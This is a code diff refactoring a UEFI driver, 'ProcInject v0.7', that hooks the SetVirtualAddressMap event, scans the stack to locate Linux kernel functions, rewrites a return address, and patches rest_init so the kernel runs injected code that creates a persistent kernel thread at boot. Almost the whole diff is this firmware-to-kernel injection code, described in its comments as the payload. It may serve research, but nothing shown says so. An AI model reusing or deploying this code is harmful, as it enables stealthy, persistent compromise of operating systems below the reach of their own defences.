@@ -1,6 +1,7 @@
 #include "drv.h"
 #include "kernel_config.h"
 #include "logging.h"
+#include "inject_context.h"
 #include <Library/UefiBootServicesTableLib.h>
 #include <Library/UefiRuntimeLib.h>
 
@@ -121,19 +122,7 @@ UINT8 patch_code_2[] = {
 // Configuration and state
 INJECT_CONFIG gInjectConfig;
 
-// Runtime state (discovered addresses and pointers)
-UINT8 StrBuffer[256]; // For debug messages
-UINT8* printk;        // Address of the printk routine in linux kernel
-UINT8* __kmalloc;     // Address of the __kmalloc routine in linux kernel
-UINT8* msleep;        // Address of the msleep routine in linux kernel
-UINT8* kthread_create_on_node; // Address of the kthread_create_on_node routine in linux kernel
-UINT8  banner[] = "\001\063ProcInject v0.7\n";
-UINT8* destptr;
-UINT8* arch_call_rest_init = NULL;
-UINT8* rest_init = NULL;
-UINT8* complete = NULL;
-UINT8* return_from_patch;
-UINT8* patch_2;
+// UEFI event handle for SetVirtualAddressMap callback
 EFI_EVENT mVirtMemEvt;
 
 #define PUT_FIXUP(cp, addr) *(INT32*)cp = (INT32)(INT64)(addr - (cp + 4))
@@ -162,28 +151,35 @@ VerifyEfiEnterVirtualMode(UINT8* cp) {
  * Scans the call stack looking for a return address that points to code
  * matching the efi_enter_virtual_mode pattern. This is the key to finding
  * the printk address and subsequently all other kernel functions.
+ * Results are stored in the context's Stack structure.
  *
- * @param Rsp               Stack pointer from AsmGetRsp()
- * @param ReturnAddress     Output: Found return address
- * @param ReturnIndex       Output: Stack index where address was found
+ * @param Context   Inject runtime context (Stack.StackPointer must be set)
  * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
  */
 EFI_STATUS
 FindEfiEnterVirtualModeReturnAddr(
-    IN  UINT64* Rsp,
-    OUT UINT8** ReturnAddress,
-    OUT UINTN* ReturnIndex
+    IN OUT INJECT_RUNTIME_CONTEXT* Context
 )
 {
     UINTN i;
     UINT8* candidateAddr;
     EFI_STATUS status;
+    UINT64* Rsp;
 
     LOG_FUNCTION_ENTRY();
 
-    if (Rsp == NULL || ReturnAddress == NULL || ReturnIndex == NULL) {
+    if (!ValidateInjectContext(Context)) {
         LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
-                 "Invalid parameters to FindEfiEnterVirtualModeReturnAddr");
+                 "Invalid context to FindEfiEnterVirtualModeReturnAddr");
+        status = EFI_INVALID_PARAMETER;
+        LOG_FUNCTION_EXIT(status);
+        return status;
+    }
+
+    Rsp = Context->Stack.StackPointer;
+    if (Rsp == NULL) {
+        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
+                 "Stack pointer not set in context");
         status = EFI_INVALID_PARAMETER;
         LOG_FUNCTION_EXIT(status);
         return status;
@@ -207,8 +203,11 @@ FindEfiEnterVirtualModeReturnAddr(
             // Verify if this address points to the expected code pattern
             //
             if (VerifyEfiEnterVirtualMode(candidateAddr)) {
-                *ReturnAddress = candidateAddr;
-                *ReturnIndex = i;
+                //
+                // Store results in context
+                //
+                Context->Stack.EevmReturnAddr = candidateAddr;
+                Context->Stack.EevmStackIndex = i;
 
                 LOG_INFO("Found efi_enter_virtual_mode return address: 0x%llx (stack index 0x%x)",
                         candidateAddr, i);
@@ -233,24 +232,35 @@ FindEfiEnterVirtualModeReturnAddr(
  *
  * Uses the kernel configuration to calculate offsets to other required
  * kernel functions. Also fixes up the msleep call in the proc_template.
+ * Results are stored in the context's KernelFuncs structure.
  *
- * @param EevmReturnAddr    The efi_enter_virtual_mode return address
+ * @param Context   Inject runtime context (Stack.EevmReturnAddr must be set)
  * @return EFI_SUCCESS if successful
  */
 EFI_STATUS
 CalculateKernelFunctionAddresses(
-    IN UINT8* EevmReturnAddr
+    IN OUT INJECT_RUNTIME_CONTEXT* Context
 )
 {
     INT32 offset;
     UINT8* cp;
+    UINT8* EevmReturnAddr;
     EFI_STATUS status;
 
     LOG_FUNCTION_ENTRY();
 
+    if (!ValidateInjectContext(Context)) {
+        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
+                 "Invalid context to CalculateKernelFunctionAddresses");
+        status = EFI_INVALID_PARAMETER;
+        LOG_FUNCTION_EXIT(status);
+        return status;
+    }
+
+    EevmReturnAddr = Context->Stack.EevmReturnAddr;
     if (EevmReturnAddr == NULL) {
         LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
-                 "Invalid parameter to CalculateKernelFunctionAddresses");
+                 "EevmReturnAddr not set in context");
         status = EFI_INVALID_PARAMETER;
         LOG_FUNCTION_EXIT(status);
         return status;
@@ -261,29 +271,29 @@ CalculateKernelFunctionAddresses(
     // The call instruction is at offset 0x10 from the return address
     //
     offset = *(INT32*)(EevmReturnAddr + 0x10);
-    printk = (EevmReturnAddr + 0x14) + offset;
-    LOG_ADDRESS(LOG_LEVEL_INFO, "printk", printk);
+    Context->KernelFuncs.Printk = (EevmReturnAddr + 0x14) + offset;
+    LOG_ADDRESS(LOG_LEVEL_INFO, "printk", Context->KernelFuncs.Printk);
 
     //
     // Use kernel configuration to calculate other function addresses
     //
-    __kmalloc = CalculateKernelAddress(printk,
-                                       gInjectConfig.KernelConfig->PrintkToKmalloc);
-    LOG_ADDRESS(LOG_LEVEL_DEBUG, "__kmalloc", __kmalloc);
+    Context->KernelFuncs.Kmalloc = CalculateKernelAddress(Context->KernelFuncs.Printk,
+                                                          Context->Config->KernelConfig->PrintkToKmalloc);
+    LOG_ADDRESS(LOG_LEVEL_DEBUG, "__kmalloc", Context->KernelFuncs.Kmalloc);
 
-    msleep = CalculateKernelAddress(printk,
-                                    gInjectConfig.KernelConfig->PrintkToMsleep);
-    LOG_ADDRESS(LOG_LEVEL_DEBUG, "msleep", msleep);
+    Context->KernelFuncs.Msleep = CalculateKernelAddress(Context->KernelFuncs.Printk,
+                                                         Context->Config->KernelConfig->PrintkToMsleep);
+    LOG_ADDRESS(LOG_LEVEL_DEBUG, "msleep", Context->KernelFuncs.Msleep);
 
-    kthread_create_on_node = CalculateKernelAddress(printk,
-                                                    gInjectConfig.KernelConfig->PrintkToKthreadCreateOnNode);
-    LOG_ADDRESS(LOG_LEVEL_DEBUG, "kthread_create_on_node", kthread_create_on_node);
+    Context->KernelFuncs.KthreadCreateOnNode = CalculateKernelAddress(Context->KernelFuncs.Printk,
+                                                                       Context->Config->KernelConfig->PrintkToKthreadCreateOnNode);
+    LOG_ADDRESS(LOG_LEVEL_DEBUG, "kthread_create_on_node", Context->KernelFuncs.KthreadCreateOnNode);
 
     //
     // Fix up the msleep call in our kthread code template
     //
     cp = &proc_template[17];
-    *(UINT64*)cp = (UINT64)msleep;
+    *(UINT64*)cp = (UINT64)Context->KernelFuncs.Msleep;
     LOG_DEBUG("Fixed up msleep call in proc_template");
 
     status = EFI_SUCCESS;
@@ -297,28 +307,42 @@ CalculateKernelFunctionAddresses(
  * Patches the kernel code immediately before the efi_enter_virtual_mode
  * return address to call printk with our banner message. This allows us
  * to announce ourselves during boot.
+ * Results are stored in the context's Patches structure.
  *
- * @param Rsp               Stack pointer
- * @param EevmReturnAddr    The efi_enter_virtual_mode return address
- * @param ReturnIndex       Stack index of the return address
+ * @param Context   Inject runtime context
  * @return EFI_SUCCESS if patch installed successfully
  */
 EFI_STATUS
 InstallPatch1_PrintkBanner(
-    IN OUT UINT64* Rsp,
-    IN     UINT8* EevmReturnAddr,
-    IN     UINTN ReturnIndex
+    IN OUT INJECT_RUNTIME_CONTEXT* Context
 )
 {
     UINTN i, j;
     UINT8* cp;
+    UINT8* destptr;
+    UINT64* Rsp;
+    UINT8* EevmReturnAddr;
+    UINTN ReturnIndex;
+    UINT8 banner[] = "\001\063ProcInject v0.7\n";
     EFI_STATUS status;
 
     LOG_FUNCTION_ENTRY();
 
+    if (!ValidateInjectContext(Context)) {
+        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
+                 "Invalid context to InstallPatch1_PrintkBanner");
+        status = EFI_INVALID_PARAMETER;
+        LOG_FUNCTION_EXIT(status);
+        return status;
+    }
+
+    Rsp = Context->Stack.StackPointer;
+    EevmReturnAddr = Context->Stack.EevmReturnAddr;
+    ReturnIndex = Context->Stack.EevmStackIndex;
+
     if (Rsp == NULL || EevmReturnAddr == NULL) {
         LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
-                 "Invalid parameters to InstallPatch1_PrintkBanner");
+                 "Stack pointer or EevmReturnAddr not set in context");
         status = EFI_INVALID_PARAMETER;
         LOG_FUNCTION_EXIT(status);
         return status;
@@ -359,7 +383,7 @@ InstallPatch1_PrintkBanner(
     // 2. call printk (relative call)
     //
     cp += (4 + 1);
-    PUT_FIXUP(cp, printk);
+    PUT_FIXUP(cp, Context->KernelFuncs.Printk);
     LOG_VERBOSE("Fixed up printk call");
 
     //
@@ -367,6 +391,12 @@ InstallPatch1_PrintkBanner(
     //
     Rsp[ReturnIndex] = (UINT64)(destptr + sizeof(banner));
     LOG_DEBUG("Modified stack return address to 0x%llx", Rsp[ReturnIndex]);
+
+    //
+    // Store patch location in context
+    //
+    Context->Patches.Patch1Destination = destptr;
+    Context->Patches.Patch1Installed = TRUE;
 
     LOG_INFO("Patch 1 installed successfully at 0x%llx", destptr);
 
@@ -381,32 +411,40 @@ InstallPatch1_PrintkBanner(
  * Searches the stack for the start_kernel return address by looking for
  * a sequence of call instructions followed by mfence. The last call before
  * mfence is arch_call_rest_init.
+ * Results are stored in the context.
  *
- * @param Rsp                   Stack pointer
- * @param StartIndex            Index to start searching from
- * @param ArchCallRestInit      Output: Address of arch_call_rest_init
- * @param StartKernelRetAddr    Output: start_kernel return address
+ * @param Context   Inject runtime context
  * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
  */
 EFI_STATUS
 FindArchCallRestInit(
-    IN  UINT64* Rsp,
-    IN  UINTN StartIndex,
-    OUT UINT8** ArchCallRestInit,
-    OUT UINT8** StartKernelRetAddr
+    IN OUT INJECT_RUNTIME_CONTEXT* Context
 )
 {
     UINTN i, j;
     UINT8* cp;
     BOOLEAN found;
     INT32 offset;
+    UINT64* Rsp;
+    UINTN StartIndex;
     EFI_STATUS status;
 
     LOG_FUNCTION_ENTRY();
 
-    if (Rsp == NULL || ArchCallRestInit == NULL || StartKernelRetAddr == NULL) {
+    if (!ValidateInjectContext(Context)) {
         LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
-                 "Invalid parameters to FindArchCallRestInit");
+                 "Invalid context to FindArchCallRestInit");
+        status = EFI_INVALID_PARAMETER;
+        LOG_FUNCTION_EXIT(status);
+        return status;
+    }
+
+    Rsp = Context->Stack.StackPointer;
+    StartIndex = Context->Stack.EevmStackIndex;
+
+    if (Rsp == NULL) {
+        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
+                 "Stack pointer not set in context");
         status = EFI_INVALID_PARAMETER;
         LOG_FUNCTION_EXIT(status);
         return status;
@@ -438,8 +476,8 @@ FindArchCallRestInit(
             }
 
             if (found) {
-                *StartKernelRetAddr = (UINT8*)Rsp[i];
-                LOG_DEBUG("Found 10+ consecutive calls at 0x%llx", *StartKernelRetAddr);
+                Context->Stack.StartKernelRetAddr = (UINT8*)Rsp[i];
+                LOG_DEBUG("Found 10+ consecutive calls at 0x%llx", Context->Stack.StartKernelRetAddr);
 
                 //
                 // Skip over remaining call instructions until we find mfence
@@ -457,10 +495,10 @@ FindArchCallRestInit(
                     //
                     cp -= 4;  // Point to offset within call instruction
                     offset = *(INT32*)cp;
-                    *ArchCallRestInit = (cp + 4) + offset;
+                    Context->InitFuncs.ArchCallRestInit = (cp + 4) + offset;
 
-                    LOG_INFO("Found start_kernel return address: 0x%llx", *StartKernelRetAddr);
-                    LOG_ADDRESS(LOG_LEVEL_INFO, "arch_call_rest_init", *ArchCallRestInit);
+                    LOG_INFO("Found start_kernel return address: 0x%llx", Context->Stack.StartKernelRetAddr);
+                    LOG_ADDRESS(LOG_LEVEL_INFO, "arch_call_rest_init", Context->InitFuncs.ArchCallRestInit);
 
                     status = EFI_SUCCESS;
                     LOG_FUNCTION_EXIT(status);
@@ -488,31 +526,35 @@ FindArchCallRestInit(
  *
  * Analyzes arch_call_rest_init to find rest_init, then locates the
  * complete(&kthreadd_done) call that we need to patch.
+ * Results are stored in the context's InitFuncs structure.
  *
- * @param ArchCallRestInit      Address of arch_call_rest_init
- * @param RestInit              Output: Address of rest_init
- * @param CompleteCall          Output: Address of complete() call
- * @param ReturnFromPatch       Output: Address to return to after patch
+ * @param Context   Inject runtime context
  * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
  */
 EFI_STATUS
 FindRestInitCompleteCall(
-    IN  UINT8* ArchCallRestInit,
-    OUT UINT8** RestInit,
-    OUT UINT8** CompleteCall,
-    OUT UINT8** ReturnFromPatch
+    IN OUT INJECT_RUNTIME_CONTEXT* Context
 )
 {
     UINT8* cp;
     INT32 offset;
+    UINT8* ArchCallRestInit;
     EFI_STATUS status;
 
     LOG_FUNCTION_ENTRY();
 
-    if (ArchCallRestInit == NULL || RestInit == NULL ||
-        CompleteCall == NULL || ReturnFromPatch == NULL) {
+    if (!ValidateInjectContext(Context)) {
         LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
-                 "Invalid parameters to FindRestInitCompleteCall");
+                 "Invalid context to FindRestInitCompleteCall");
+        status = EFI_INVALID_PARAMETER;
+        LOG_FUNCTION_EXIT(status);
+        return status;
+    }
+
+    ArchCallRestInit = Context->InitFuncs.ArchCallRestInit;
+    if (ArchCallRestInit == NULL) {
+        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
+                 "ArchCallRestInit not set in context");
         status = EFI_INVALID_PARAMETER;
         LOG_FUNCTION_EXIT(status);
         return status;
@@ -546,17 +588,17 @@ FindRestInitCompleteCall(
     //
     cp += 10;  // Point to offset within call instruction
     offset = *(INT32*)cp;
-    *RestInit = (cp + 4) + offset;
+    Context->InitFuncs.RestInit = (cp + 4) + offset;
 
-    LOG_ADDRESS(LOG_LEVEL_INFO, "rest_init", *RestInit);
+    LOG_ADDRESS(LOG_LEVEL_INFO, "rest_init", Context->InitFuncs.RestInit);
 
     //
     // Find the complete(&kthreadd_done) call in rest_init
     // Use kernel configuration for the offset
     //
-    cp = *RestInit + gInjectConfig.KernelConfig->RestInitToCompleteOffset;
+    cp = Context->InitFuncs.RestInit + Context->Config->KernelConfig->RestInitToCompleteOffset;
     LOG_DEBUG("Looking for complete() call at rest_init+0x%x (0x%llx)",
-             gInjectConfig.KernelConfig->RestInitToCompleteOffset, (UINT64)cp);
+             Context->Config->KernelConfig->RestInitToCompleteOffset, (UINT64)cp);
 
     //
     // Verify this is a call instruction
@@ -564,19 +606,19 @@ FindRestInitCompleteCall(
     if (*cp != 0xe8) {
         LOG_ERROR(INJECT_ERROR_COMPLETE_INVALID_INSN,
                  "Expected call instruction (0xe8) at rest_init+0x%x, found 0x%x",
-                 gInjectConfig.KernelConfig->RestInitToCompleteOffset, *cp);
+                 Context->Config->KernelConfig->RestInitToCompleteOffset, *cp);
         status = EFI_NOT_FOUND;
         LOG_FUNCTION_EXIT(status);
         return status;
     }
 
-    *ReturnFromPatch = cp;
+    Context->InitFuncs.ReturnFromPatch = cp;
     cp++;  // Point to offset
     offset = *(INT32*)cp;
-    *CompleteCall = (cp + 4) + offset;
+    Context->InitFuncs.Complete = (cp + 4) + offset;
 
-    LOG_ADDRESS(LOG_LEVEL_DEBUG, "complete", *CompleteCall);
-    LOG_DEBUG("Return-from-patch address: 0x%llx", (UINT64)*ReturnFromPatch);
+    LOG_ADDRESS(LOG_LEVEL_DEBUG, "complete", Context->InitFuncs.Complete);
+    LOG_DEBUG("Return-from-patch address: 0x%llx", (UINT64)Context->InitFuncs.ReturnFromPatch);
 
     status = EFI_SUCCESS;
     LOG_FUNCTION_EXIT(status);
@@ -589,28 +631,41 @@ FindRestInitCompleteCall(
  * Installs the kernel thread creation code that will run after kthreadd
  * is initialized but before the system goes multi-threaded. This is the
  * main payload that creates our persistent thread.
+ * Results are stored in the context's Patches structure.
  *
- * @param StartKernelRetAddr    Address in start_kernel to write patch code
- * @param ReturnFromPatch       Address to return to after patch executes
- * @param CompleteCall          Address of complete(&kthreadd_done) function
+ * @param Context   Inject runtime context
  * @return EFI_SUCCESS if patch installed successfully
  */
 EFI_STATUS
 InstallPatch2_KthreadCreate(
-    IN UINT8* StartKernelRetAddr,
-    IN UINT8* ReturnFromPatch,
-    IN UINT8* CompleteCall
+    IN OUT INJECT_RUNTIME_CONTEXT* Context
 )
 {
     UINT8* cp;
     UINTN i;
+    UINT8* patch_2;
+    UINT8* StartKernelRetAddr;
+    UINT8* ReturnFromPatch;
+    UINT8* CompleteCall;
     EFI_STATUS status;
 
     LOG_FUNCTION_ENTRY();
 
+    if (!ValidateInjectContext(Context)) {
+        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
+                 "Invalid context to InstallPatch2_KthreadCreate");
+        status = EFI_INVALID_PARAMETER;
+        LOG_FUNCTION_EXIT(status);
+        return status;
+    }
+
+    StartKernelRetAddr = Context->Stack.StartKernelRetAddr;
+    ReturnFromPatch = Context->InitFuncs.ReturnFromPatch;
+    CompleteCall = Context->InitFuncs.Complete;
+
     if (StartKernelRetAddr == NULL || ReturnFromPatch == NULL || CompleteCall == NULL) {
         LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
-                 "Invalid parameters to InstallPatch2_KthreadCreate");
+                 "Required addresses not set in context");
         status = EFI_INVALID_PARAMETER;
         LOG_FUNCTION_EXIT(status);
         return status;
@@ -649,12 +704,12 @@ InstallPatch2_KthreadCreate(
 
     // 1. call __kmalloc
     cp = patch_2 + 0x13;
-    PUT_FIXUP(cp, __kmalloc);
+    PUT_FIXUP(cp, Context->KernelFuncs.Kmalloc);
     LOG_VERBOSE("Fixed up __kmalloc call at offset 0x13");
 
     // 2. call kthread_create_on_node
     cp = patch_2 + 0x3d;
-    PUT_FIXUP(cp, kthread_create_on_node);
+    PUT_FIXUP(cp, Context->KernelFuncs.KthreadCreateOnNode);
     LOG_VERBOSE("Fixed up kthread_create_on_node call at offset 0x3d");
 
     // 3. call complete(&kthreadd_done)
@@ -675,6 +730,12 @@ InstallPatch2_KthreadCreate(
     cp++;
     PUT_FIXUP(cp, patch_2);
     LOG_DEBUG("Patched rest_init at 0x%llx with jump to patch_2", (UINT64)ReturnFromPatch);
+
+    //
+    // Store patch location in context
+    //
+    Context->Patches.Patch2Destination = patch_2;
+    Context->Patches.Patch2Installed = TRUE;
 
     LOG_INFO("Patch 2 installed successfully at 0x%llx", (UINT64)patch_2);
 
@@ -709,13 +770,8 @@ VirtMemCallback(
 )
 {
 	EFI_STATUS efiStatus;
+	INJECT_RUNTIME_CONTEXT injectContext;
 	UINT64* rsp;
-	UINT8* eevmReturnAddr;
-	UINTN retaddrIndex;
-	UINT8* startKernelReturnAddr;
-	UINT8* restInitAddr;
-	UINT8* completeAddr;
-	UINT8* returnFromPatch;
 
 	UNREFERENCED_PARAMETER(Event);
 	UNREFERENCED_PARAMETER(Context);
@@ -728,86 +784,97 @@ VirtMemCallback(
 	LOG_INFO("=================================================");
 
 	//
+	// Initialize runtime context
+	//
+	efiStatus = InitializeInjectContext(&injectContext, &gInjectConfig);
+	if (EFI_ERROR(efiStatus)) {
+		LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER, "Failed to initialize inject context: %r", efiStatus);
+		return;
+	}
+
+	//
 	// Get current stack pointer to search for kernel return addresses
 	//
 	rsp = AsmGetRsp();
-	printk = NULL;
+	injectContext.Stack.StackPointer = rsp;
 	LOG_DEBUG("Stack pointer: 0x%llx", (UINT64)rsp);
 
 	//
 	// Step 1: Find efi_enter_virtual_mode return address
 	//
 	LOG_INFO("Step 1: Finding efi_enter_virtual_mode return address");
-	efiStatus = FindEfiEnterVirtualModeReturnAddr(rsp, &eevmReturnAddr, &retaddrIndex);
+	efiStatus = FindEfiEnterVirtualModeReturnAddr(&injectContext);
 	if (EFI_ERROR(efiStatus)) {
 		LOG_ERROR(INJECT_ERROR_EEVM_NOT_FOUND, "Step 1 FAILED - Aborting injection");
+		injectContext.LastError = efiStatus;
 		return;
 	}
+	MarkStepCompleted(&injectContext, INJECT_STEP_EEVM_FOUND);
 	LOG_INFO("Step 1: SUCCESS");
 
 	//
 	// Step 2: Calculate kernel function addresses
 	//
 	LOG_INFO("Step 2: Calculating kernel function addresses");
-	efiStatus = CalculateKernelFunctionAddresses(eevmReturnAddr);
+	efiStatus = CalculateKernelFunctionAddresses(&injectContext);
 	if (EFI_ERROR(efiStatus)) {
 		LOG_ERROR(INJECT_ERROR_PRINTK_CALC_FAILED, "Step 2 FAILED: %r", efiStatus);
+		injectContext.LastError = efiStatus;
 		return;
 	}
+	MarkStepCompleted(&injectContext, INJECT_STEP_ADDRESSES_CALCULATED);
 	LOG_INFO("Step 2: SUCCESS");
 
 	//
 	// Step 3: Install Patch 1 - Printk banner
 	//
 	LOG_INFO("Step 3: Installing Patch 1 (printk banner)");
-	efiStatus = InstallPatch1_PrintkBanner(rsp, eevmReturnAddr, retaddrIndex);
+	efiStatus = InstallPatch1_PrintkBanner(&injectContext);
 	if (EFI_ERROR(efiStatus)) {
 		LOG_ERROR(INJECT_ERROR_PATCH1_INSTALL_FAILED, "Step 3 FAILED: %r", efiStatus);
+		injectContext.LastError = efiStatus;
 		return;
 	}
+	MarkStepCompleted(&injectContext, INJECT_STEP_PATCH1_INSTALLED);
 	LOG_INFO("Step 3: SUCCESS");
 
 	//
 	// Step 4: Find arch_call_rest_init
 	//
 	LOG_INFO("Step 4: Finding arch_call_rest_init");
-	efiStatus = FindArchCallRestInit(rsp, retaddrIndex,
-	                                 &arch_call_rest_init,
-	                                 &startKernelReturnAddr);
+	efiStatus = FindArchCallRestInit(&injectContext);
 	if (EFI_ERROR(efiStatus)) {
 		LOG_ERROR(INJECT_ERROR_ARCH_CALL_REST_INIT_INVALID, "Step 4 FAILED - Aborting injection");
+		injectContext.LastError = efiStatus;
 		return;
 	}
+	MarkStepCompleted(&injectContext, INJECT_STEP_ARCH_CALL_FOUND);
 	LOG_INFO("Step 4: SUCCESS");
 
 	//
 	// Step 5: Find rest_init and complete(&kthreadd_done) call
 	//
 	LOG_INFO("Step 5: Finding rest_init and complete() call");
-	efiStatus = FindRestInitCompleteCall(arch_call_rest_init,
-	                                     &restInitAddr,
-	                                     &completeAddr,
-	                                     &returnFromPatch);
+	efiStatus = FindRestInitCompleteCall(&injectContext);
 	if (EFI_ERROR(efiStatus)) {
 		LOG_ERROR(INJECT_ERROR_REST_INIT_NOT_FOUND, "Step 5 FAILED - Aborting injection");
+		injectContext.LastError = efiStatus;
 		return;
 	}
-
-	rest_init = restInitAddr;
-	complete = completeAddr;
+	MarkStepCompleted(&injectContext, INJECT_STEP_REST_INIT_FOUND);
 	LOG_INFO("Step 5: SUCCESS");
 
 	//
 	// Step 6: Install Patch 2 - Kernel thread creation
 	//
 	LOG_INFO("Step 6: Installing Patch 2 (kernel thread creation)");
-	efiStatus = InstallPatch2_KthreadCreate(startKernelReturnAddr,
-	                                        returnFromPatch,
-	                                        completeAddr);
+	efiStatus = InstallPatch2_KthreadCreate(&injectContext);
 	if (EFI_ERROR(efiStatus)) {
 		LOG_ERROR(INJECT_ERROR_PATCH2_INSTALL_FAILED, "Step 6 FAILED: %r", efiStatus);
+		injectContext.LastError = efiStatus;
 		return;
 	}
+	MarkStepCompleted(&injectContext, INJECT_STEP_PATCH2_INSTALLED);
 	LOG_INFO("Step 6: SUCCESS");
 
 	//
